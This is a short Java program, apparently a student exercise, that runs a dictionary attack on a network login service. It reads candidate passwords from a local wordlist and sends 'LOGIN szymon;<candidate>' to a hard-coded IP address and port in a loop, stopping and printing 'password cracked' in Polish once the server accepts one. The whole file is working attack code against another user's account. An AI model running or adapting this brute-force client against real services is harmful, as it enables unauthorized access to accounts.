
	import java.io.*;
import java.net.*;
import java.util.*;
	 
	public class EchoClient {
	   
	   
	    public static void main(String[] args) throws IOException {
	 
	        Socket echoSocket = null;
	        PrintWriter out = null;
	        BufferedReader in = null;
	        Scanner sIn=null;
	        String zwrot=null;
	        String [] userInput;
	        long  linia;
	        try{
	           sIn=new Scanner(new File("C:/Users/aga/workspace/1/dane"));
	        }catch (Exception e) {System.out.println("blad wczytywania");}
	        
	        
	        linia = 12150;
	        for(int i =0;i<linia;i++){
	        	sIn.nextLine();
	        }
	        	while (zwrot==null || zwrot.matches("false"))
	         {
	             try {
	                echoSocket = new Socket("149.156.98.145", 3000);
	               
	                out = new PrintWriter(echoSocket.getOutputStream(), true);
	                in = new BufferedReader(new InputStreamReader(
	                echoSocket.getInputStream()));
	            } catch (UnknownHostException e) {
	                System.err.println("Don't know about host: 149.156.98.145");
	                System.exit(1);
	            } catch (IOException e) {
	                System.err.println("Couldn't get I/O for "
	                + "the connection to: 149.156.98.145");
	                System.exit(1);
	            }
	     
	             	
	            
	            	userInput= sIn.nextLine().split("/");
	           
	            	out.println("LOGIN szymon;"+ userInput[0]);
	            	
	            	zwrot=in.readLine();
	            	System.out.println(userInput[0]);
	            	System.out.println("zwrot: " + zwrot + " " + linia);
	            	linia++;
	            	if (zwrot.equals("false")==false)
	            	{
	            		System.out.println("************************************");
	            		System.out.println("Has³o z³amane");
	            	}  
	            	
	            	
	            	out.close();
	    	        in.close();
	    	        echoSocket.close();
	           } 
	         sIn.close();
	    }
	}

